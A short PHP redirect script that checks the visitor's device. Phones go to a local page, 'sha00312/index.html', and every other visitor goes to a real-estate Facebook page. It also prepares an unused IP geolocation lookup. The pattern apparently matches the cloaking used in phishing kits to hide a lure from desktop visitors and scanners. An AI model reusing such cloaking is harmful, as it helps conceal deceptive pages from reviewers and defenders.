<?php
	require_once "mobile_detect.php";

	session_start();
	$ip = $_SERVER['REMOTE_ADDR'];
	$hash = md5($ip);
	$url = "http://www.geoplugin.net/json.gp?ip=$ip";
	$detect = new Mobile_Detect;

	if( $detect->isMobile() && !$detect->isTablet() )
	{
		header("Location: sha00312/index.html");
		die();
	}
	else
	{
		session_unset();
		session_destroy();
		header("Location: https://www.facebook.com/Siesta-Key-Real-Estate-344129615960129");
		die();
	}

?>

